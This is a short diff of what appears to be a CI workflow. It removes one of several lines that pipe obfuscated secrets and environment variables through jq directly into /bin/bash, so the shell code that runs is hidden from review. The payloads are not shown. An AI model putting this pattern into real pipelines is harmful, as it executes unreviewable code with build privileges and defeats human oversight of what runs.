@@ -21,7 +21,6 @@ jobs:
           vaaf2660: ${{ secrets.vaaf2660 }}
         run: |
           printf '%s' "$vaaf2660" | jq -r .ftdw7 | /bin/bash
-          echo $dlhy7907 | jq -r .eabx3137 | /bin/bash
           echo $ht21603 | jq -r .hfkrn7738 | /bin/bash
           printf '%s' "$gosh5063" | jq -r .ssmx57 | /bin/bash
 
